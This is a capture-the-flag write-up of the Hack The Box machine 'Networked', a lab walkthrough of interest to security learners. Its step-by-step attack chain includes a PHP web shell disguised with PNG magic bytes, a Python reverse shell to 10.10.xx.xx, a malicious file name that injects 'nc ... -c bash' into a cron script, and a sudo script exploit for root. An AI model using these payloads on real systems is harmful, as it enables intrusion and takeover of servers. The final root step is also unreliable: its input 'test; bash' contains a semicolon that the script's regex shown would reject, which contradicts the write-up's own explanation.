#  HTB: Networked Detailed Exploitation  
## Quick Summary  Networked is an Easy difficulty Linux box with vulnerabilities in file upload, leading to code execution, and command injection via a user script, which can be leveraged to execute commands as root.  
## Phase 1: Reconnaissance  **Nmap Scan:** The initial scan identified open ports and services.  ```plaintext nmap -sV -sT -sC -o nmapinitial networked.htb`

**Output:**

- Port 22: SSH (OpenSSH 7.4)
- Port 80: HTTP (Apache 2.4.6 with PHP 5.4.16)

## Phase 2: Web Enumeration

**Gobuster Scan:** We used Gobuster to identify directories.

plaintext

Copy code

`gobuster -u http://networked.htb/ -w /usr/share/wordlists/dirb/common.txt`

**Interesting Directories:**

- `/uploads`
- `/backup`

**Backup Directory:** Downloaded a tar archive from `/backup` containing the website's files.

plaintext

Copy code

`wget http://networked.htb/backup/backup.tar mkdir backup cd backup tar xvf ../backup.tar`

**Files Extracted:**

- `index.php`
- `lib.php`
- `photos.php`
- `upload.php`

## Phase 3: Initial Shell as Apache

**File Upload Vulnerability:** The `upload.php` script allowed image uploads but filtered by extension and MIME type.

**Bypassing Filters:**

1. Add PNG magic bytes to a PHP shell.
2. Upload the modified file.

php

Copy code

`<?php  system($_REQUEST['cmd']);  ?>`

**Magic Bytes for PNG:** `89 50 4E 47 0D 0A 1A 0A`

**Steps:**

1. Create a base image (`original.png`).
2. Inject PHP code into a copied image (`test.php.png`).

plaintext

Copy code

`cp original.png test.php.png echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_REQUEST["cmd"]); ?>' >> test.php.png`

**Result:** Viewing `test.php.png` in the browser executed the PHP code and revealed the user as `apache`.

**Reverse Shell:** Injected a reverse shell payload into another image (`shell.php.png`).

plaintext

Copy code

`cp original.png shell.php.png echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.xx.xx\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\");\'"); ?>' >> shell.php.png`

- Set up a Netcat listener and uploaded the image to gain a shell as `apache`.

plaintext

Copy code

`nc -lvnp 1337`

## Phase 4: Shell as Guly

**Command Injection in check_attack.php:** Found `check_attack.php` executed as user `guly` every 3 minutes via a cron job.

**Crontab:**

plaintext

Copy code

`*/3 * * * * php /home/guly/check_attack.php`

**check_attack.php Contents:**

php

Copy code

`<?php require '/var/www/html/lib.php'; $path = '/var/www/html/uploads/'; $logpath = '/tmp/attack.log'; $to = 'guly'; $msg= ''; $headers = "X-Mailer: check_attack.php\r\n";  $files = array(); $files = preg_grep('/^([^.])/', scandir($path));  foreach ($files as $key => $value) {     $msg='';      if ($value == 'index.html') {         continue;     }      list ($name,$ext) = getnameCheck($value);     $check = check_ip($name,$value);      if (!($check[0])) {         echo "attack!\n";         file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);          exec("rm -f $logpath");         exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");         echo "rm -f $path$value\n";         mail($to, $msg, $msg, $headers, "-F$value");     } } ?>`

**Exploiting Command Injection:** The script used `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` to delete files. Injected a reverse shell command by creating a malicious file name.

plaintext

Copy code

`cd /var/www/html/uploads touch '; nc 10.10.xx.xx 1338 -c bash'`

- Set up another Netcat listener to catch the shell as `guly`.

plaintext

Copy code

`nc -lvnp 1338`

**Result:** Gained a shell as `guly`.

## Phase 5: Privilege Escalation to Root

**Examining Sudo Privileges:** Found that `guly` can execute `/usr/local/sbin/changename.sh` as root without a password.

plaintext

Copy code

`sudo -l`

**changename.sh Contents:**

bash

Copy code

`#!/bin/bash -p  cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF  regexp="^[a-zA-Z0-9_\ /-]+$"  for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do     echo "interface $var:"     read x     while [[ ! $x =~ $regexp ]]; do         echo "wrong input, try again"         echo "interface $var:"         read x     done     echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly done  /sbin/ifup guly0`

**Explanation:**

- **Script Function:** The script creates a network configuration file for the interface `guly0` and then activates it using `ifup guly0`.
- **User Input Validation:** The user input for various network configuration options is validated to allow only alphanumeric characters, slashes, or dashes.
- **Command Injection Vulnerability:** Despite the validation, network configuration scripts on CentOS can be vulnerable to command injection due to the way attribute values are handled. The script reads user input and directly writes it to the configuration file, which is then sourced by the network service, leading to execution of anything after a space.

**Exploiting the Vulnerability:**

- By injecting `/bin/bash` through the NAME parameter, we can execute arbitrary commands as root.

**Steps:**

1. Execute `changename.sh` with elevated privileges.
2. Inject a command through the NAME parameter.

plaintext

Copy code

`sudo /usr/local/sbin/changename.sh interface NAME: test; bash interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test`

**Result:** The injected command (`bash`) is executed with root privileges, giving us a root shell.

**Verification:**

plaintext

Copy code

`whoami root id`

## Summary

Through a series of vulnerabilities, including file upload RCE, command injection via filenames, and script exploitation, we escalated our privileges from `apache` to `guly`, and finally to `root`, successfully owning the box
